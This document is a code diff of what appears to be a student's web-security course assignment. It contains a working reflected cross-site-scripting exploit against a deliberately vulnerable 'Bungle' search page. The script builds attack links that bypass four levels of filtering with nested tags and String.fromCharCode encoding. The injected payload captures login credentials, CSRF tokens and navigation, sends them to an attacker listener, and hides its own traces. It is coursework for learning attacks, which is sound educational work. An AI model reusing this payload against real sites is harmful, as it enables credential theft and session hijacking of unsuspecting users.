@@ -7,70 +7,90 @@ body {background-image: url("https://i.imgur.com/GpCfuFQ.png");background-repeat
 h3 a {color: black;}
 </style>
 <script>
-function payload(atkr){
+function payload(attacker){
 let href=location.href;
 const rEv=(inP)=>{
     console.log(inP);
-    $.get(atkr,inP);}
+    $.get(attacker,inP);
+}
 const pReq=(eN,lgE)=>{
     var usr=$("#username").val();
     var pwd=$("#userpass").val();
     $.post("./"+eN,{username:usr,password:pwd},()=>{
-        rEv({evt:lgE,user:usr,pass:pwd});
-        ldP("./");});}
+        rEv({event:lgE,user:usr,pass:pwd});
+        ldP("./");}
+    );
+}
 const getH=()=>{
     const gH=sessionStorage.getItem('history');
-    return gH?JSON.parse(gH):[];}
+    return gH?JSON.parse(gH):[];
+}
 const setH=(gH)=>{
-    sessionStorage.setItem('history',JSON.stringify(gH));}
+    sessionStorage.setItem('history',JSON.stringify(gH));
+}
 const addH=(rsrc)=>{
     const gh=getH();
-    gh.push(rsrc),setH(gh);}
+    gh.push(rsrc),setH(gh);
+}
 const newH=(href)=>{
-    addH(href),window.history.pushState({},"",href);}
+    addH(href),window.history.pushState({},"",href);
+}
 const ldP=(href,Qry)=>{
     $("html").load(href,()=>{
         $("html").show();
         $("#query").val(Qry);
-        $(document).ready(()=>{
-            var tknELM=document.querySelector('input[name="csrf_token"]');
-            var tknVAL=tknELM.value;
-            rEv({evt:"tknex",csrf_token:tknVAL});});
         var usr=$("#logged-in-user").val();
-        rEv({evt:"navigation",user:usr,uri:href});
+        $(document).ready(()=>{
+            var tknELM=document.querySelector("input[name='csrf_token']");
+            if (tknELM !== null){
+                var tknVAL=tknELM.value;
+                rEv({event:"tknex",csrf_token:tknVAL});
+            }else{
+                console.log("notkn");
+            }
+        });
+        rEv({event:"nav",user:usr,url:href});
         window.history.replaceState({},"",href);
         $(".history-item").each((_,item)=>{
             if($(item).text().includes("function payload(")){
-            $(item).remove();}});
-        $("#log-in-btn").on("click",evt=>{
+            $(item).remove();
+            }});
+        $("#log-in-btn").on("click",event=>{
             event.preventDefault();
-            pReq("login","login");});
-        $("#new-account-btn").on("click",evt=>{
+            pReq("login","login");
+        });
+        $("#new-account-btn").on("click",event=>{
             event.preventDefault();
-            pReq("create", "login");});
-        $("#log-out-btn").on("click",evt=>{
+            pReq("create", "login");
+        });
+        $("#log-out-btn").on("click",event=>{
             event.preventDefault();
             var usr = $("#logged-in-user").text();
             $.post("./logout",()=>{
-                rEv({evt:"logout",user:usr});
-                ldP("./");});});
-        $("#bungle-lnk").on("click",evt=>{
+                rEv({event:"logout",user:usr});
+                ldP("./");
+            });
+        });
+        $("#bungle-lnk").on("click",event=>{
             event.preventDefault();
             href="/project2b/"
             newH(href);
-            ldP(href);});
-        $("#search-again-btn").on("click",evt=>{
+            ldP(href);
+        });
+        $("#search-again-btn").on("click",event=>{
             event.preventDefault();
             newH(href);
-            ldP("./");});
-        $("#search-btn").on("click",evt=>{
+            ldP("./");
+        });
+        $("#search-btn").on("click",event=>{
             event.preventDefault();
             Qry=$("#query").val();
             Qry=Qry.replace(/ /g,"+");
             href="./search?q="+Qry;
             newH(href);
-            ldP(href,Qry);});
-        $(window).on("popstate",evt=>{
+            ldP(href,Qry);
+        });
+        $(window).on("popstate",event=>{
             const gH=getH();
                 if(gH.length>1){
                     const prvH=gH.pop();
@@ -78,8 +98,11 @@ const ldP=(href,Qry)=>{
                     ldP(prvH);
                 }else{
                     ldP(gH[0]);
-                }});
-    });}
+                }
+        });        
+    }
+);
+}
 $("html").hide();
 ldP("./");
 }
@@ -93,19 +116,19 @@ function ncdSTR(query){
         ncdedSTR="String.fromCharCode("+ncdedSTR+")"; 
         query=query.replace(match[0],ncdedSTR);}return query;}  
 function mkLnk(xssdefense,target,atkr){
-    var bQry=target+"./search?csrfdefense=0&xssdefense="+xssdefense.toString()+"&q=";
+    var bQry=target+"./search?xssdefense="+xssdefense.toString()+"&q=";
     var payLd=payload.toString()+";payload(\""+atkr+"\");";
     switch(xssdefense){
     case 0:return bQry+encodeURIComponent("<script"+">"+payLd+"</script"+">");
     case 1:
     case 2:return bQry+encodeURIComponent("<scrscriptipt>"+payLd+"</scrscriptipt"+">");
     case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}
-const target = "http://localhost:34443/project2b/";
-const atkr = "http://localhost:31337/";
+const target = "http://cs526-online.cs.purdue.edu/project2b/";
+const atkr =  "http://127.0.0.1:31337/";
 $(function(){
     var container = $("<div></div>").addClass("links-container");
     for(var xssdefense=0;xssdefense<=3;xssdefense++){
         var url=mkLnk(xssdefense,target,atkr);
-        container.append("<h3><a target=\"run\" href=\""+url+"\" id=\"try_link_"+xssdefense+"\">Try Bungle! xssdefense="+xssdefense.toString()+"</a></h3>");}
+        container.append("<h3><a target=\"run\" href=\""+url+"\" id=\"try_link_"+xssdefense+"\">Try Bungle! "+xssdefense.toString()+"</a></h3>");}
         $("body").append(container);});
 </script>
